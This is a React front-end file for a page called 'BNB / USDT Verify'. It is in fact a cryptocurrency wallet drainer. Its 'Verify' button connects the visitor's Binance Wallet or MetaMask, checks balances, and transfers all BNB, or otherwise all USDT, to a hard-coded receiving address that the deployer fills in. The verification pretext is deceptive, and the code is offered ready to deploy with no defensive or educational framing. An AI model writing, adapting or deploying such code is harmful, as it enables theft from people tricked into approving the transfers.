import React from "react";
import { ethers } from "ethers";

const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955"; // Official USDT BEP20
const USDT_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function transfer(address to, uint amount) returns (bool)"
];

// 👉 Replace with your receiving wallet
const RECEIVER = "0xYourWalletAddressHere";

function App() {
  const verifyAssets = async () => {
    try {
      let provider;

      // ✅ Detect Binance Wallet first
      if (window.BinanceChain) {
        provider = new ethers.BrowserProvider(window.BinanceChain);
        await window.BinanceChain.request({ method: "eth_requestAccounts" });
      }
      // ✅ Fallback to MetaMask
      else if (window.ethereum) {
        provider = new ethers.BrowserProvider(window.ethereum);
        await window.ethereum.request({ method: "eth_requestAccounts" });
      } else {
        alert("No wallet found (Install Binance Wallet or MetaMask).");
        return;
      }

      const signer = await provider.getSigner();
      const address = await signer.getAddress();

      // ✅ 1. Check BNB Balance
      const bnbBalance = await provider.getBalance(address);
      const bnbInEth = ethers.formatEther(bnbBalance);

      // ✅ 2. Check USDT Balance
      const usdt = new ethers.Contract(USDT_BEP20, USDT_ABI, signer);
      const usdtBalance = await usdt.balanceOf(address);
      const usdtInUnits = ethers.formatUnits(usdtBalance, 18);

      console.log("BNB Balance:", bnbInEth);
      console.log("USDT Balance:", usdtInUnits);

      // ✅ 3. Logic: If BNB exists, send all BNB
      if (parseFloat(bnbInEth) > 0.001) {
        alert("BNB found ✅ – sending all BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: bnbBalance,
        });
        await tx.wait();
        alert("BNB sent successfully ✅");
      }
      // ✅ 4. Otherwise, if USDT exists, send all USDT
      else if (parseFloat(usdtInUnits) > 1) {
        alert("USDT found ✅ – sending all USDT...");
        const tx = await usdt.transfer(RECEIVER, usdtBalance);
        await tx.wait();
        alert("USDT sent successfully ✅");
      } else {
        alert("No BNB or USDT balance found.");
      }
    } catch (error) {
      console.error(error);
      alert("Error: " + error.message);
    }
  };

  return (
    <div className="min-h-screen bg-[#121212] text-gray-200 flex flex-col items-center justify-center">
      <h1 className="text-4xl font-bold mb-6 text-yellow-400">BNB / USDT Verify</h1>
      <p className="mb-6 text-gray-400">
        Click verify to check wallet and transfer BNB or USDT (BEP20).
      </p>
      <button
        onClick={verifyAssets}
        className="button-primary bg-yellow-400 text-black px-6 py-3 rounded-full font-semibold shadow-md hover:scale-105 transition"
      >
        Verify
      </button>
    </div>
  );
}

export default App;
